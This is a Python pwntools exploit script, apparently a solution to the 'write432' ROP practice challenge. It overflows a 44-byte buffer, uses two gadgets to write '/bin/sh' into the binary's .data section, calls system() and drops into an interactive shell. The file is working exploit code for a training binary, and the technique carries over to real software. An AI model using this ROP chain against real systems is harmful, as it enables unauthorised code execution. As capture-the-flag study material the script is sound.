#!/usr/bin/python

import os
from pwn import *

e = ELF('./write432')           		# binary
r = process(e.path)

s_data = 0x804a028						# write string in .data
bin = 0x2f62696e						# /bin
sh = 0x2f736800							# /sh
gg1 = 0x80486da 						# pop edi ; pop ebp ; ret
gg2 = 0x8048670                   		# mov DWORD PTR [edi],ebp; ret


payload = 'A' * 44						# offset to vuln buffer
payload += p32(gg1)
payload += p32(s_data) 					# pop edi [.data]
payload += p32(bin, endian='big')		# pop ebp [/bin]
payload += p32(gg2)						# copy to [edi]

payload += p32(gg1)
payload += p32(s_data+4) 				# pop edi [.data+4]
payload += p32(sh, endian='big')		# pop ebp [/sh]
payload += p32(gg2)						# copy to [edi]

payload += p32(e.symbols['system'])
payload += 'AAAA'						# should be exit()
payload += p32(s_data)

#print(payload)

r.recvuntil('>')
r.sendline(payload)						# send payload
r.interactive()
